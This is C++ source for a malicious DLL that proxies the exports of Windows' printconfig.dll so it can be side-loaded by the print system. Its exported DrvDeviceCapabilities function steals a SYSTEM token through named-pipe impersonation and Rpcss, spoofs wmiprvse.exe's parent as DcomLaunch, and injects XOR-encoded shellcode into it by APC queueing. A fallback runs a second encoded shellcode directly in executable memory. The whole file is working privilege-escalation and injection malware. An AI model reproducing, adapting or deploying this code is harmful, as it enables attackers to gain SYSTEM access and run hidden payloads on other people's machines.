// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>
#include "token.h"

#pragma comment(linker,"/export:DevQueryPrintEx=printconfig_orig.DevQueryPrintEx,@258")
#pragma comment(linker,"/export:DllCanUnloadNow=printconfig_orig.DllCanUnloadNow,@259")
#pragma comment(linker,"/export:DllGetClassObject=printconfig_orig.DllGetClassObject,@260")
#pragma comment(linker,"/export:DllRegisterServer=printconfig_orig.DllRegisterServer,@262")
#pragma comment(linker,"/export:DllUnregisterServer=printconfig_orig.DllUnregisterServer,@263")
#pragma comment(linker,"/export:DrvConvertDevMode=printconfig_orig.DrvConvertDevMode,@264")
#pragma comment(linker,"/export:DrvDevicePropertySheets=printconfig_orig.DrvDevicePropertySheets,@266")
#pragma comment(linker,"/export:DrvDocumentEvent=printconfig_orig.DrvDocumentEvent,@267")
#pragma comment(linker,"/export:DrvDocumentPropertySheets=printconfig_orig.DrvDocumentPropertySheets,@268")
#pragma comment(linker,"/export:DrvDriverEvent=printconfig_orig.DrvDriverEvent,@269")
#pragma comment(linker,"/export:DrvPopulateFilterServices=printconfig_orig.DrvPopulateFilterServices,@270")
#pragma comment(linker,"/export:DrvPrinterEvent=printconfig_orig.DrvPrinterEvent,@271")
#pragma comment(linker,"/export:DrvQueryColorProfile=printconfig_orig.DrvQueryColorProfile,@272")
#pragma comment(linker,"/export:DrvQueryJobAttributes=printconfig_orig.DrvQueryJobAttributes,@273")
#pragma comment(linker,"/export:DrvResetConfigCache=printconfig_orig.DrvResetConfigCache,@255")
#pragma comment(linker,"/export:DrvSplDeviceCaps=printconfig_orig.DrvSplDeviceCaps,@254")
#pragma comment(linker,"/export:DrvUpgradePrinter=printconfig_orig.DrvUpgradePrinter,@274")
#pragma comment(linker,"/export:GetStandardMessageForPrinterStatus=printconfig_orig.GetStandardMessageForPrinterStatus,@300")
#pragma comment(linker,"/export:MxdcGetPDEVAdjustment=printconfig_orig.MxdcGetPDEVAdjustment,@256")
#pragma comment(linker,"/export:NotifyEntry=printconfig_orig.NotifyEntry,@275")
#pragma comment(linker,"/export:ServiceMain=printconfig_orig.ServiceMain,@257")

BOOL CreateCmdAsSystem() {
	//This method can be used for executing commands
	HANDLE hSystemToken;
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, 
		&hSystemToken))
	{
		//wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
		return FALSE;
	}

	HANDLE hPrimary;
	if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, 
		SecurityImpersonation, TokenPrimary, &hPrimary))
	{
		DWORD LastError = GetLastError();
		//wprintf(L"ERROR: Could not duplicate process token [%d]\n", LastError);
		return FALSE;
	}

	WCHAR commandline[] = L"cmd.exe";
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");

	if (!CreateProcessAsUser(hPrimary, NULL, commandline, NULL, NULL, 0, 
		CREATE_UNICODE_ENVIRONMENT|CREATE_NEW_CONSOLE|CREATE_BREAKAWAY_FROM_JOB,
		NULL, NULL, &si, &pi)) {
		//printf("\n[-] CreateProcessAsUser is FAILED: %d", GetLastError());
		return FALSE;
	}
	Sleep(3000);
	WaitForSingleObject(pi.hProcess, INFINITE);
	return TRUE;
}

void GenRandomString(wchar_t* s, const int len)
{
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}
	s[len] = 0;
}

BOOL GetSystem() {
	//Create Random Pipename
	WCHAR pipename[12] = { 0 };
	GenRandomString(pipename, 11);
	//wprintf(L"\n[*] PipeName; \\\\.\\pipe\\%s", pipename);

	HANDLE hPipe;
	WCHAR server[512];
	DWORD dwRead = 0;
	HANDLE hProc;

	HANDLE hPipe2;
	WCHAR server2[512];
	DWORD cbWritten = 0;

	HANDLE hToken = INVALID_HANDLE_VALUE;

	wsprintf(server, L"\\\\.\\pipe\\%s", pipename);
	wsprintf(server2, L"\\\\localhost\\pipe\\%s", pipename);

	hPipe = CreateNamedPipe(L"\\\\.\\pipe\\pipey",
		PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
		PIPE_TYPE_BYTE |
		PIPE_READMODE_BYTE |
		PIPE_WAIT |
		PIPE_ACCEPT_REMOTE_CLIENTS,
		PIPE_UNLIMITED_INSTANCES,
		4096,
		4096,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);

	hPipe2 = CreateFile(L"\\\\localhost\\pipe\\pipey",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);
	WriteFile(hPipe2, &hPipe, sizeof(hPipe2), NULL, NULL);
	ReadFile(hPipe, &hPipe, sizeof(hPipe), NULL, NULL);
	if (!ImpersonateNamedPipeClient(hPipe)) {
		//printf("\n[-] ERROR impersonating the client: %d", GetLastError());
		return FALSE;
	}
	if (FAILED(GetServiceHandle(L"Rpcss", &hProc))) {
		//printf("\n[-] ERROR GetServiceHandle %d", GetLastError());
		CloseHandle(hProc);
		return FALSE;
	}

	if (FAILED(GetSystemTokenFromProcess(hProc))) {
		//printf("\n[-] ERROR GetSystemTokenFromProcess %d", GetLastError());
		CloseHandle(hProc);
		return FALSE;
	}
	CloseHandle(hProc);
	return TRUE;
}

VOID ExecSc() {
	//This is a backup method if other fails
	//It will be executed if SYSTEM token is failed to be impersonated
	//Change the shellcode in both methods
	unsigned char shellcode[] =
		"\xeb\x27\x5b\x53\x5f\xb0\x7c\xfc\xae\x75\xfd\x57\x59\x53\x5e"
		"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\xdb\xaf"
		"\x74\x07\x80\x3e\x7c\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff"
		"\xff\x14\x7c\xe8\x5c\x97\xf0\xe4\xfc\xd8\x14\x14\x14\x55\x45"
		"\x55\x44\x46\x45\x42\x5c\x25\xc6\x71\x5c\x9f\x46\x74\x5c\x9f"
		"\x46\x0c\x5c\x9f\x46\x34\x5c\x1b\xa3\x5e\x5e\x5c\x9f\x66\x44"
		"\x59\x25\xdd\x5c\x25\xd4\xb8\x28\x75\x68\x16\x38\x34\x55\xd5"
		"\xdd\x19\x55\x15\xd5\xf6\xf9\x46\x5c\x9f\x46\x34\x9f\x56\x28"
		"\x5c\x15\xc4\x55\x45\x72\x95\x6c\x0c\x1f\x16\x1b\x91\x66\x14"
		"\x14\x14\x9f\x94\x9c\x14\x14\x14\x5c\x91\xd4\x60\x73\x5c\x15"
		"\xc4\x44\x9f\x5c\x0c\x50\x9f\x54\x34\x5d\x15\xc4\xf7\x42\x5c"
		"\xeb\xdd\x55\x9f\x20\x9c\x59\x25\xdd\x5c\x15\xc2\x5c\x25\xd4"
		"\xb8\x55\xd5\xdd\x19\x55\x15\xd5\x2c\xf4\x61\xe5\x58\x17\x58"
		"\x30\x1c\x51\x2d\xc5\x61\xcc\x4c\x50\x9f\x54\x30\x5d\x15\xc4"
		"\x72\x55\x9f\x18\x5c\x50\x9f\x54\x08\x5d\x15\xc4\x55\x9f\x10"
		"\x9c\x5c\x15\xc4\x55\x4c\x55\x4c\x4a\x4d\x4e\x55\x4c\x55\x4d"
		"\x55\x4e\x5c\x97\xf8\x34\x55\x46\xeb\xf4\x4c\x55\x4d\x4e\x5c"
		"\x9f\x06\xfd\x5f\xeb\xeb\xeb\x49\x5c\x25\xcf\x47\x5d\xaa\x63"
		"\x7d\x7a\x7d\x7a\x71\x60\x14\x55\x42\x5c\x9d\xf5\x5d\xd3\xd6"
		"\x58\x63\x32\x13\xeb\xc1\x47\x47\x5c\x9d\xf5\x47\x4e\x59\x25"
		"\xd4\x59\x25\xdd\x47\x47\x5d\xae\x2e\x42\x6d\xb3\x14\x14\x14"
		"\x14\xeb\xc1\xfc\x1b\x14\x14\x14\x25\x2d\x26\x3a\x25\x22\x2c"
		"\x3a\x21\x22\x3a\x25\x24\x25\x14\x4e\x5c\x9d\xd5\x5d\xd3\xd4"
		"\x48\x05\x14\x14\x59\x25\xdd\x47\x47\x7e\x17\x47\x5d\xae\x43"
		"\x9d\x8b\xd2\x14\x14\x14\x14\xeb\xc1\xfc\x24\x14\x14\x14\x3b"
		"\x5e\x22\x70\x5c\x24\x51\x62\x77\x4c\x5e\x6c\x65\x62\x53\x61"
		"\x39\x5a\x43\x52\x63\x25\x63\x47\x47\x5a\x26\x76\x63\x4c\x63"
		"\x23\x47\x46\x4d\x4c\x39\x21\x57\x44\x66\x5d\x61\x72\x5b\x5d"
		"\x64\x14\x5c\x9d\xd5\x47\x4e\x55\x4c\x59\x25\xdd\x47\x5c\xac"
		"\x14\x16\x3c\x90\x14\x14\x14\x14\x44\x47\x47\x5d\xd3\xd6\xff"
		"\x41\x3a\x2f\xeb\xc1\x5c\x9d\xd2\x7e\x1e\x4b\x47\x4e\x5c\x9d"
		"\xe5\x59\x25\xdd\x59\x25\xdd\x47\x47\x5d\xd3\xd6\x39\x12\x0c"
		"\x6f\xeb\xc1\x91\xd4\x61\x0b\x5c\xd3\xd5\x9c\x07\x14\x14\x5d"
		"\xae\x50\xe4\x21\xf4\x14\x14\x14\x14\xeb\xc1\x5c\xeb\xdb\x60"
		"\x16\xff\xd8\xfc\x41\x14\x14\x14\x47\x4d\x7e\x54\x4e\x5d\x9d"
		"\xc5\xd5\xf6\x04\x5d\xd3\xd4\x14\x04\x14\x14\x5d\xae\x4c\xb0"
		"\x47\xf1\x14\x14\x14\x14\xeb\xc1\x5c\x87\x47\x47\x5c\x9d\xf3"
		"\x5c\x9d\xe5\x5c\x9d\xce\x5d\xd3\xd4\x14\x34\x14\x14\x5d\x9d"
		"\xed\x5d\xae\x06\x82\x9d\xf6\x14\x14\x14\x14\xeb\xc1\x5c\x97"
		"\xd0\x34\x91\xd4\x60\xa6\x72\x9f\x13\x5c\x15\xd7\x91\xd4\x61"
		"\xc6\x4c\xd7\x4c\x7e\x14\x4d\x5d\xd3\xd6\xe4\xa1\xb6\x42\xeb"
		"\xc1\xdb\xaf";
	LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode) * 2, 0x3000, 0x40);
	RtlMoveMemory(addr, shellcode, sizeof(shellcode));
	((void(*)())addr)();
}

DWORD InjectNewProcess(HANDLE hParent) {
	unsigned char shellcode[] =
		"\xeb\x27\x5b\x53\x5f\xb0\x84\xfc\xae\x75\xfd\x57\x59\x53\x5e"
		"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\x7d\x12"
		"\x74\x07\x80\x3e\x84\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff"
		"\xff\x03\x04\x84\xff\x4c\x80\xe0\xf3\xec\xcf\x04\x03\x04\x42"
		"\x55\x42\x54\x51\x4c\x32\xd6\x52\x52\x66\x4c\x88\x56\x63\x4c"
		"\x88\x56\x1b\x4c\x88\x56\x23\x4c\x0c\xb3\x49\x4e\x4b\x8f\x71"
		"\x54\x4e\x35\xca\x4c\x32\xc4\xaf\x38\x62\x78\x01\x28\x23\x45"
		"\xc2\xcd\x0e\x45\x02\xc5\xe1\xe9\x51\x45\x52\x4c\x88\x56\x23"
		"\x8f\x41\x38\x4b\x05\xd3\x62\x82\x7c\x1b\x0f\x01\x0b\x86\x76"
		"\x03\x04\x03\x8f\x83\x8c\x03\x04\x03\x4c\x86\xc4\x77\x63\x4b"
		"\x05\xd3\x40\x88\x44\x23\x4d\x02\xd4\x88\x4c\x1b\x54\xe0\x52"
		"\x4e\x35\xca\x4c\xfc\xcd\x42\x8f\x37\x8c\x4b\x05\xd5\x4c\x32"
		"\xc4\xaf\x45\xc2\xcd\x0e\x45\x02\xc5\x3b\xe4\x76\xf5\x4f\x07"
		"\x4f\x20\x0b\x41\x3a\xd5\x76\xdc\x5b\x40\x88\x44\x27\x4d\x02"
		"\xd4\x65\x45\x88\x08\x4b\x40\x88\x44\x1f\x4d\x02\xd4\x42\x8f"
		"\x07\x8c\x4b\x05\xd3\x45\x5b\x45\x5b\x5a\x5a\x5e\x42\x5c\x42"
		"\x5d\x42\x5e\x4b\x87\xef\x24\x42\x56\xfc\xe4\x5b\x45\x5a\x5e"
		"\x4b\x8f\x11\xed\x48\xfb\xfc\xfb\x5e\x4c\x32\xdf\x50\x4d\xbd"
		"\x73\x6a\x6a\x6a\x6a\x66\x70\x03\x45\x55\x4c\x8a\xe5\x4a\xc3"
		"\xc1\x48\x74\x22\x04\xfb\xd6\x57\x50\x4c\x8a\xe5\x50\x5e\x4e"
		"\x35\xc3\x49\x32\xcd\x50\x57\x4a\xbe\x39\x52\x7a\xa3\x03\x04"
		"\x03\x04\xfc\xd1\xeb\x0b\x03\x04\x03\x35\x3a\x36\x2d\x35\x35"
		"\x3c\x2d\x31\x35\x2a\x32\x34\x32\x04\x59\x4c\x8a\xc5\x4a\xc3"
		"\xc3\xff\x23\x04\x03\x49\x32\xcd\x50\x57\x69\x07\x50\x4d\xb9"
		"\x53\x8a\x9b\xc5\x04\x03\x04\x03\xfb\xd6\xec\x36\x04\x03\x04"
		"\x2c\x4f\x3a\x52\x42\x74\x6d\x3c\x3b\x62\x40\x49\x69\x71\x40"
		"\x4f\x35\x62\x46\x33\x69\x53\x52\x73\x5c\x30\x3a\x49\x74\x6c"
		"\x70\x3d\x70\x4c\x7a\x37\x4f\x76\x64\x73\x51\x56\x4f\x5d\x73"
		"\x7c\x70\x52\x4d\x46\x52\x69\x03\x4c\x8a\xc5\x50\x5e\x42\x5c"
		"\x4e\x35\xca\x57\x4b\xbc\x03\x36\xab\x80\x03\x04\x03\x04\x53"
		"\x57\x50\x4d\xc4\xc6\xe8\x51\x2d\x3f\xfc\xd1\x4b\x8d\xc5\x6e"
		"\x09\x5b\x4b\x8d\xf2\x6e\x1c\x5e\x51\x6c\x83\x37\x03\x04\x4a"
		"\x8d\xe3\x6e\x07\x45\x5a\x4d\xb9\x71\x45\x9a\x85\x04\x03\x04"
		"\x03\xfb\xd6\x49\x32\xc4\x50\x5e\x4b\x8d\xf2\x49\x32\xcd\x4e"
		"\x35\xca\x57\x50\x4d\xc4\xc6\x2e\x02\x1b\x7f\xfc\xd1\x86\xc4"
		"\x76\x1b\x4b\xc3\xc2\x8c\x10\x04\x03\x4d\xb9\x40\xf3\x31\xe3"
		"\x04\x03\x04\x03\xfb\xd6\x4c\xfc\xcb\x77\x06\xe8\xae\xeb\x51"
		"\x03\x04\x03\x57\x5a\x6e\x43\x5e\x4a\x8d\xd2\xc5\xe1\x14\x4a"
		"\xc3\xc3\x04\x13\x04\x03\x4d\xb9\x5c\xa7\x57\xe6\x04\x03\x04"
		"\x03\xfb\xd6\x4c\x90\x57\x50\x4c\x8a\xe3\x4b\x8d\xf2\x4c\x8a"
		"\xde\x4a\xc3\xc3\x04\x23\x04\x03\x4d\x8a\xfd\x4a\xbe\x11\x92"
		"\x8a\xe6\x03\x04\x03\x04\xfc\xd1\x4b\x87\xc7\x24\x86\xc4\x77"
		"\xb6\x65\x8f\x04\x4c\x02\xc7\x86\xc4\x76\xd6\x5b\xc7\x5b\x6e"
		"\x03\x5d\x4a\xc3\xc1\xf4\xb6\xa6\x55\xfb\xd6\x7d\x12";

	STARTUPINFOEX si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	ZeroMemory(&si, sizeof(STARTUPINFOEX));
	//Host process can be changed
	WCHAR cmdline[MAX_PATH] = L"C:\\Windows\\System32\\wbem\\wmiprvse.exe -Embedding";
	
	// PPID Spoof: https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing
	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = 
		(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc
		(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, 
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
		&hParent, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);
	
	// https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection
	CreateProcessW(NULL, cmdline, NULL, NULL, FALSE, 
		EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED|CREATE_NO_WINDOW, 
		NULL, NULL, &si.StartupInfo, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;

	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, 
		sizeof(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

	WriteProcessMemory(victimProcess, shellAddress, shellcode, 
		sizeof(shellcode), NULL);
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
	ResumeThread(threadHandle);

	return 0;
}

DWORD WINAPI StartInjector(PVOID) {
	HANDLE hSystemToken;
	HANDLE hParent;

	if (!GetSystem()) {
		//printf("\n[-] Failed to get SYSTEM token.");
		return 46;
	}

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, 
		FALSE, &hSystemToken))
	{
		//wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
		return -1;
	}

	if (FAILED(GetServiceHandle(L"DcomLaunch", &hParent))) {
		//printf("\n[-] ERROR GetServiceHandle DcomLaunch %d", GetLastError());
		CloseHandle(hParent);
		return -1;
	}
	
	//printf("\n[+] Trying to inject to the victim process...");
	InjectNewProcess(hParent);
	
	CloseHandle(hSystemToken);
	CloseHandle(hParent);
	return 0;

}


extern "C" __declspec(dllexport) DWORD DrvDeviceCapabilities() {
	//Create mutex to block multiple execution
	HANDLE hMutex = CreateMutex(nullptr, TRUE, L"printjacked");
	if (ERROR_ALREADY_EXISTS == GetLastError()) {
		CloseHandle(hMutex);
		return 0;
	}

	HANDLE hThread = CreateThread(nullptr, 0, StartInjector, 
		nullptr, 0, nullptr);
	if (!hThread) {
		//printf("\n[-] ERROR Creating thread: %d", GetLastError());
		return -1;
	}
	WaitForSingleObject(hThread, INFINITE);
	
	DWORD result;
	GetExitCodeThread(hThread, &result);

	if (result == 46) {
		//printf("\n[+] Continuing with current token...");
		ExecSc();
	}

	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

